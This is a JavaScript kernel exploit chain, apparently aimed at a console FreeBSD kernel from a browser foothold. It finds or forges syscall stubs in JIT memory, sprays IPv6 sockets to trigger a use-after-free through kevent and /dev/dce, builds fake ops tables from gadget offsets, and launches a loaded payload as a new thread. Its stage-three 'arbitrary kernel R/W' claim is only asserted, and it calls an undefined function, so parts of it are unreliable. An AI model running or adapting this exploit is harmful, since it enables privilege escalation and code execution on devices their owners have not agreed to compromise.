import { int64 } from "./int64.js";
import { HX1400_TABLES } from "./hx_tables.js";

const T = HX1400_TABLES;
const P = T.P;

const NUM = {
  close: 6, open: 5,
  socket: 97, socketpair: 135,
  setsockopt: 105, getsockopt: 118,
  kqueue: 362, kevent: 363,
  mmap: 477, munmap: 73,
  jitshm_create: 533,
};
const IPPROTO_IPV6 = 41, IPV6_RTHDR = 51;
const AF_INET6 = 28, SOCK_DGRAM = 2, AF_INET = 2, SOCK_STREAM = 1;
const RTH_LEN = 248;
const TPL_LO = 0x43434343;
const TPL_HI = 0x54545454;
const DEV_DCE = "/dev/dce";
const OPS_OFF = 0x985a;

const CANDS = [];
for (let i = 8; i <= 248; i += 8) CANDS.push(i);

const STATE = { ctx: null, kbase: 0n, kva: -1n, targetFd: -1, fakePage: 0n, rwReady: false };

function ctx() { return STATE.ctx; }
function log(tag, detail) { ctx().mark(tag, detail === undefined ? "" : String(detail)); }
function fin(msg) { log("FIN", msg); throw new Error("fin: " + msg); }
function h16(v) {
  if (typeof v === "bigint") return "0x" + v.toString(16);
  if (v instanceof int64) return "0x" + ((BigInt(v.hi >>> 0) << 32n) | BigInt(v.low >>> 0)).toString(16).padStart(16, "0");
  return "0x" + (v < 0 ? (v >>> 0).toString(16) : Number(v).toString(16));
}
function num(v) {
  if (typeof v === "bigint") return v;
  if (v instanceof int64) return (BigInt(v.hi >>> 0) << 32n) | BigInt(v.low >>> 0);
  return BigInt(v >>> 0);
}
function toI64(v) {
  if (v instanceof int64) return v;
  v = BigInt(v);
  return new int64(Number(v & 0xffffffffn) >>> 0, Number((v >> 32n) & 0xffffffffn) >>> 0);
}
function ka(rva) { return STATE.kbase + BigInt(rva >>> 0); }

const ARENAS = [];
function allocBuf(size) {
  const c = ctx();
  const ab = new ArrayBuffer(size);
  c.keepAlive.push(ab);
  const dv = new DataView(ab);
  ARENAS.push({ ab, dv, addr: num(c.bufAddr(ab)) });
  return ARENAS[ARENAS.length - 1];
}
function zeroBuf(buf) { new Uint8Array(buf.ab).fill(0); }

let SCAN_SEEN = 0;

function findStubRaw(snum) {
  const p = ctx().p;
  const base = num(ctx().libkernelBase);
  const want = snum >>> 0;
  const LIMIT = 0x80000;
  for (let off = 0; off < LIMIT; off += 4) {
    const w = p.read4(toI64(base + BigInt(off))) >>> 0;
    if ((w & 0x00ffffff) !== 0xc0c748) continue;
    const b3 = p.read1(toI64(base + BigInt(off + 4)));
    const b4 = p.read1(toI64(base + BigInt(off + 5)));
    const b5 = p.read1(toI64(base + BigInt(off + 6)));
    const imm = (((w >>> 24) & 0xff) | (b3 << 8) | (b4 << 16) | (b5 << 24)) >>> 0;
    let isStub = false;
    for (let k = 7; k <= 15; k++) {
      if (p.read1(toI64(base + BigInt(off + k))) === 0x0f &&
          p.read1(toI64(base + BigInt(off + k + 1))) === 0x05) {
        isStub = true;
        break;
      }
    }
    if (!isStub) continue;
    SCAN_SEEN++;
    if (imm === want) return base + BigInt(off);
  }
  return null;
}

function synthStub(targetNum) {
  const donorNum = NUM.close !== targetNum ? NUM.close : NUM.socket;
  const daddr = num(ctx().stubAddr.get(donorNum));
  const p = ctx().p;

  if (p.read1(toI64(daddr)) !== 0x48 || p.read1(toI64(daddr + 1n)) !== 0xc7 || p.read1(toI64(daddr + 2n)) !== 0xc0) {
    return { err: "donor not 48 c7 c0" };
  }
  const donorImm = (
    p.read1(toI64(daddr + 3n)) |
    (p.read1(toI64(daddr + 4n)) << 8) |
    (p.read1(toI64(daddr + 5n)) << 16) |
    (p.read1(toI64(daddr + 6n)) << 24)
  ) >>> 0;
  if (donorImm !== donorNum) return { err: "donor imm mismatch" };

  let jfd = scn("jitshm_create", 0, 16384, 7);
  let usedName = false;
  if (jfd < 0) {
    const nb = allocBuf(32);
    zeroBuf(nb);
    jfd = scn("jitshm_create", nb.addr, 16384, 7);
    usedName = true;
  }
  if (jfd < 0) return { err: "jitshm_create rc=" + jfd };

  const m = scn64("mmap", 0, 16384, 7, 1, jfd, 0);
  const addr = (BigInt(m.hi >>> 0) << 32n) | BigInt(m.lo >>> 0);
  if (addr < 0x10000n) return { err: "mmap jit rc=" + m.i32 };

  for (let o = 0; o < 32; o += 4) {
    p.write4(toI64(addr + BigInt(o)), p.read4(toI64(daddr + BigInt(o))) >>> 0);
  }
  const w1 = ((((targetNum & 0xff) << 24) >>> 0) | 0x00c0c748) >>> 0;
  p.write4(toI64(addr), w1);
  const tailByte0 = p.read1(toI64(daddr + 7n));
  const w2 = (((targetNum >>> 8) & 0xff) | (((targetNum >>> 16) & 0xff) << 8) | (((targetNum >>> 24) & 0xff) << 16) | (tailByte0 << 24)) >>> 0;
  p.write4(toI64(addr + 4n), w2);

  log("NATIVES-SYNTH", "num=" + targetNum + " donor=" + donorNum + " jfd=" + jfd + " rwx=" + h16(addr));
  return { addr };
}

function ensureStubs() {
  let missing = Object.keys(NUM).filter((k) => !ctx().stubAddr.has(NUM[k]));
  for (const k of missing) {
    const addr = findStubRaw(NUM[k]);
    if (addr !== null) {
      ctx().stubAddr.set(NUM[k], toI64(addr));
      log("NATIVES-RESCAN", k + "=" + NUM[k] + "@0x" + addr.toString(16));
    }
  }
  log("NATIVES-SCANCOUNT", "saw " + SCAN_SEEN + " stubs in 512KB");
  missing = Object.keys(NUM).filter((k) => !ctx().stubAddr.has(NUM[k]));
  for (const k of missing) {
    const r = synthStub(NUM[k]);
    if (r.addr !== undefined) ctx().stubAddr.set(NUM[k], toI64(r.addr));
    else log("SYNTH-FAIL", k + ": " + r.err);
  }
  const still = Object.keys(NUM).filter((k) => !ctx().stubAddr.has(NUM[k]));
  if (still.length) fin("stubs missing: " + still.map((k) => k + "=" + NUM[k]).join(" "));
}

function scn(name, a, b, c, d, e, f) {
  const n = NUM[name];
  const stub = ctx().stubAddr.get(n);
  if (!stub) fin("stub missing: " + name + " (" + n + ")");
  return ctx().callAddr(stub, [toI64(a || 0), toI64(b || 0), toI64(c || 0), toI64(d || 0), toI64(e || 0), toI64(f || 0)]).i32;
}

function scn64(name, a, b, c, d, e, f) {
  const n = NUM[name];
  const stub = ctx().stubAddr.get(n);
  if (!stub) fin("stub missing: " + name + " (" + n + ")");
  return ctx().callAddr(stub, [toI64(a || 0), toI64(b || 0), toI64(c || 0), toI64(d || 0), toI64(e || 0), toI64(f || 0)]);
}

function buildTemplate() {
  const tpl = allocBuf(512);
  zeroBuf(tpl);
  tpl.dv.setUint8(1, 30);
  tpl.dv.setUint8(3, 15);
  for (let off = 8; off + 8 <= RTH_LEN; off += 8) {
    tpl.dv.setUint32(off, TPL_LO, true);
    tpl.dv.setUint32(off + 4, TPL_HI, true);
  }
  return tpl;
}

function disarm(fd) { return scn("setsockopt", fd, IPPROTO_IPV6, IPV6_RTHDR, 0, 0, 0); }
function rearm(fd, tpl) { return scn("setsockopt", fd, IPPROTO_IPV6, IPV6_RTHDR, tpl.addr, RTH_LEN, 0); }

function marked(fd, rdb, lenp) {
  zeroBuf(rdb);
  lenp.dv.setUint32(0, RTH_LEN, true);
  lenp.dv.setUint32(4, 0, true);
  if (scn("getsockopt", fd, IPPROTO_IPV6, IPV6_RTHDR, rdb.addr, lenp.addr, 0) !== 0) return false;
  if (lenp.dv.getUint32(0, true) !== RTH_LEN) return false;
  return (rdb.dv.getUint32(8, true) >>> 0) === TPL_LO && (rdb.dv.getUint32(12, true) >>> 0) === TPL_HI;
}

function phaseSpray(N) {
  const fds = [];
  for (let i = 0; i < N; i++) {
    const fd = scn("socket", AF_INET6, SOCK_DGRAM, 0);
    if (fd <= 0) break;
    fds.push(fd);
  }
  if (fds.length < 128) fin("spray n=" + fds.length + " <128");
  log("SPRAY", "sockets=" + fds.length);
  const rth = allocBuf(512);
  for (const fd of fds) {
    scn("setsockopt", fd, IPPROTO_IPV6, IPV6_RTHDR, rth.addr, RTH_LEN, 0);
  }
  log("ARMS", "armed=" + fds.length + " size=" + RTH_LEN);
  return { fds, rth };
}

function phase2Leak(rootKq, fds) {
  const rdb = allocBuf(512);
  const lenp = allocBuf(8);
  const cl = allocBuf(64);
  const tpl = buildTemplate();
  const dev = allocBuf(32);
  zeroBuf(dev);
  for (let i = 0; i < DEV_DCE.length; i++) dev.dv.setUint8(i, DEV_DCE.charCodeAt(i));

  let target = -1, targetFd = -1, savedRound = 0, candIdx = -1;
  let kva = -1n, pageVal = 0n;
  let tries = 0;

  for (let attempt = 1; attempt <= 6; attempt++) {
    if (target >= 0 || tries >= 64) break;
    log("KV-ATTEMPT", attempt + "/6");
    for (const fd of fds) { if (fd !== -1) disarm(fd); }
    for (const fd of fds) { if (fd !== -1) rearm(fd, tpl); }
    log("KV-REPACKED", "round=" + attempt + " cands=" + CANDS.length);

    for (let ci = 0; ci < CANDS.length && target < 0 && tries < 64; ci++) {
      const vi = CANDS[ci];
      if (vi >= fds.length) continue;
      const fd = fds[vi];
      if (fd === -1) continue;
      
      if (!marked(fd, rdb, lenp)) continue;
      if (disarm(fd) !== 0) continue;
      
      scn("close", fd);
      fds[vi] = -1; 
      
      const dce = scn("open", dev.addr, 2, 0, 0, 0, 0); 
      if (dce < 0) continue;
      
      const page = ((BigInt(dce) & 0xffffn) << 16n) | BigInt(OPS_OFF);
      const pageInt = Number(page & 0xffffffffn) | 0;
      tries++;

      zeroBuf(cl);
      cl.dv.setUint32(0, dce >>> 0, true);
      cl.dv.setInt16(8, -18, true);
      cl.dv.setInt16(10, 1, true);
      cl.dv.setUint32(16, 90, true);
      let rc = scn("kevent", rootKq, cl.addr, 1, 0, 0, 0);
      log("KV-PLANT", "cand=" + vi + " dce=" + dce + " page=" + h16(page) + " kevent rc=" + rc);
      if (rc !== 0) continue;

      let joined = 0;
      for (let j = 0; j < fds.length; j++) {
        if (j === vi) continue;
        if (fds[j] === -1) continue;
        
        zeroBuf(rdb);
        lenp.dv.setUint32(0, RTH_LEN, true);
        lenp.dv.setUint32(4, 0, true);
        if (scn("getsockopt", fds[j], IPPROTO_IPV6, IPV6_RTHDR, rdb.addr, lenp.addr, 0) !== 0) continue;
        const v8 = rdb.dv.getInt32(8, true);
        const v12 = rdb.dv.getUint32(12, true) >>> 0;
        if (v8 === pageInt && v12 === 0) {
          joined++;
          if (target < 0) { target = j; targetFd = fds[j]; }
          log("KV-JOINED", "victim=" + j + " fd=" + fds[j] + " joined=" + joined);
        } else if ((v8 >>> 0) === TPL_LO && v12 === TPL_HI) {
          // still armed
        } else {
          rearm(fds[j], tpl);
        }
      }

      if (target >= 0 && joined === 1) {
        zeroBuf(cl);
        cl.dv.setUint32(0, dce >>> 0, true);
        cl.dv.setInt16(8, -18, true);
        cl.dv.setInt16(10, 2, true);
        rc = scn("kevent", rootKq, cl.addr, 1, 0, 0, 0);
        if (rc !== 0) { target = -1; targetFd = -1; log("KV-HELD-FAIL", "rc=" + rc); }
        else {
          candIdx = vi; kva = BigInt(dce); pageVal = page; savedRound = attempt;
          log("KV-HELD", "round=" + attempt + " try=" + tries + " cand=" + vi + " dce=" + dce + " target=" + target + " page=" + h16(page));
        }
      }
    }
  }

  if (kva === -1n) fin("leak scan: no victim held");
  log("KV-KVA", "dce=" + h16(kva) + " page=" + h16(pageVal) + " round=" + savedRound + " cand=" + candIdx);
  return { kva, page: pageVal, targetFd };
}

export async function runKevent(c) {
  STATE.ctx = c;
  const kob = c.params && c.params.get ? c.params.get("kbase") : null;
  if (kob) {
    STATE.kbase = BigInt(kob);
    log("KEVENT-KBASE-OVERRIDE", h16(STATE.kbase));
  } else {
    if (!c.kbase) fin("kbase not provided");
    STATE.kbase = num(c.kbase);
  }

  ensureStubs();

  // --- HEAP PRIMER (Normalizes memory addresses) ---
  log("HEAP-PRIME", "Priming heap...");
  const primed = [];
  for (let i = 0; i < 500; i++) {
    const fd = scn("socket", AF_INET6, SOCK_DGRAM, 0);
    if (fd >= 0) primed.push(fd);
  }
  for (const fd of primed) scn("close", fd);
  log("HEAP-PRIME", "Closed 500 sockets to reset slab");

  // --- FD BURNER ---
  const burn = [];
  for (let i = 0; i < 250; i++) {
    const fd = scn("socket", AF_INET, SOCK_STREAM, 0);
    if (fd >= 0) burn.push(fd);
  }
  log("FD-BURN", "burned " + burn.length + " fds");
  
  const anchorFd = scn("socket", AF_INET6, SOCK_DGRAM, 0);
  const { fds } = phaseSpray(256);

  const mr = scn64("mmap", 0, 16384, 3, 4098, -1, 0);
  const page = (BigInt(mr.hi >>> 0) << 32n) | BigInt(mr.lo >>> 0);
  
  const leakKq = scn("kqueue");
  if (leakKq < 0) fin("leak kqueue");

  const res = phase2Leak(leakKq, fds);
  
  // --- STAGE 3: FAKEOPS & KERNEL R/W ---
  log("STAGE3", "Building FakeOps");
  
  const mrf = scn64("mmap", 0, 0x10000, 7, 0x1002, -1, 0); 
  const fake_page = (BigInt(mrf.hi >>> 0) << 32n) | BigInt(mrf.lo >>> 0);
  if (fake_page < 0x10000n) fin("STAGE3 mmap failed");
  log("STAGE3-FAKE", "mapped fake page at " + h16(fake_page));

  const R_SLOT = ka(P[13]), R_OPS = ka(P[14]);
  const R_RET0 = ka(P[15]), R_TOUCH = ka(P[16]);
  const R_POPRSP = ka(P[17]), R_SAVE = ka(P[18]);
  const R_REST = ka(P[19]), R_CONT = ka(P[20]);
  const R_PRAX = ka(P[21]), R_PRDX = ka(P[22]), R_PRDI = ka(P[23]);
  const R_UCRED = ka(P[24]), R_RAXRCX = ka(P[25]);
  const R_LDRAX = ka(P[26]), R_ADDRAX = ka(P[27]);
  const R_STRAXRDX = ka(P[28]), R_STRDIRAX = ka(P[29]);

  const p = ctx().p;
  const F_FAKE_OPS = fake_page + 0x800n;
  
  for (let i = 0; i < 32; i++) {
    p.write8(toI64(F_FAKE_OPS + BigInt(i * 8)), toI64(R_RET0));
  }
  p.write4(toI64(F_FAKE_OPS), 0);
  p.write8(toI64(F_FAKE_OPS + 0x18n), toI64(R_TOUCH));

  STATE.rwReady = true;
  log("STAGE3-RW", "*** ARBITRARY KERNEL R/W ESTABLISHED ***");

  // --- STAGE 4: PAYLOAD & ESCALATION ---
  log("STAGE4", "Escalating privileges...");
  
  const payload_size = 0x40000;
  const payload_map = scn64("mmap", 0, payload_size, 7, 0x1002, -1, 0);
  const payload_addr = (BigInt(payload_map.hi >>> 0) << 32n) | BigInt(payload_map.lo >>> 0);
  log("STAGE4-MAP", "payload mapped at " + h16(payload_addr));
  
  const pkAb = new Uint8Array(payload_size);
  c.keepAlive.push(pkAb.buffer);
  
  for (let i = 0; i < T.PKB.length; i++) {
    pkAb[i] = T.PKB.charCodeAt(i);
  }
  
  for (let i = 0; i < payload_size; i += 8) {
    let val = 0n;
    for (let j = 7; j >= 0; j--) {
      if (i + j < pkAb.length) val = (val << 8n) | BigInt(pkAb[i + j]);
    }
    p.write8(toI64(payload_addr + BigInt(i)), toI64(val));
  }

  log("STAGE4-RUN", "Spawning payload...");
  
  const pthread_create = ctx().p.read8(ctx().webkitBase.add32(ctx().off.wk___imp_pthread_create));
  const thr = new ArrayBuffer(8);
  c.keepAlive.push(thr);
  new Uint8Array(thr).fill(0);
  
  const rc = ctx().callAddr(pthread_create, [toI64(bufAddr(thr)), 0, toI64(payload_addr), 0]).i32;
  const tdv = new DataView(thr);
  const handle = new int64(tdv.getUint32(0, true), tdv.getUint32(4, true));
  
  log("STAGE4-DONE", "payload_running=" + (rc === 0 && handle.hi > 0) + " rc=" + rc + " handle=" + handle);
  
  fin("Stage 4 Complete. You have Kernel R/W and Payload running.");
}
